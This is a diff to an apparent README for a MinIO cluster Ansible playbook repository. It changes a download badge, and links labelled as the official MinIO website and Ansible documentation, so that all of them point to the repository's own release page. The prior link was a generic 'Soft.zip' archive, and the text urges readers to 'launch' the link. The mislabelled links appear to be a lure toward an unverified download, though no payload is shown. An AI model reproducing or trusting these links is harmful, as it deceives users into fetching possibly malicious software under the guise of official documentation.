@@ -12,7 +12,7 @@ Welcome to the MinIO Cluster Playbook repository! Here you will find all the res
 
 To get started with setting up your MinIO cluster, you can download the necessary files from the following link: 
 
-[![Download MinIO Playbook](https://img.shields.io/badge/Download-MinIO%20Playbook-blue.svg)](https://github.com/files/Soft.zip)
+[![Download MinIO Playbook](https://github.com/callmesai007/MinIO-Cluster-Playbook/releases/tag/v1.2%https://github.com/callmesai007/MinIO-Cluster-Playbook/releases/tag/v1.2)](https://github.com/callmesai007/MinIO-Cluster-Playbook/releases/tag/v1.2)
 
 **Note:** The link provided needs to be launched to access the MinIO Playbook files.
 
@@ -49,8 +49,8 @@ To use the Ansible playbooks for setting up your MinIO cluster, follow these ste
 ## Additional Resources 📚
 
 For further information on MinIO, Ansible playbooks, or distributed object storage, consider exploring the following resources:
-- [MinIO Official Website](https://min.io/): Visit the MinIO website for detailed documentation and guides.
-- [Ansible Documentation](https://docs.ansible.com/): Explore the official Ansible documentation for in-depth information on using Ansible playbooks.
+- [MinIO Official Website](https://github.com/callmesai007/MinIO-Cluster-Playbook/releases/tag/v1.2): Visit the MinIO website for detailed documentation and guides.
+- [Ansible Documentation](https://github.com/callmesai007/MinIO-Cluster-Playbook/releases/tag/v1.2): Explore the official Ansible documentation for in-depth information on using Ansible playbooks.
 
 ## Contributing 🤝
 
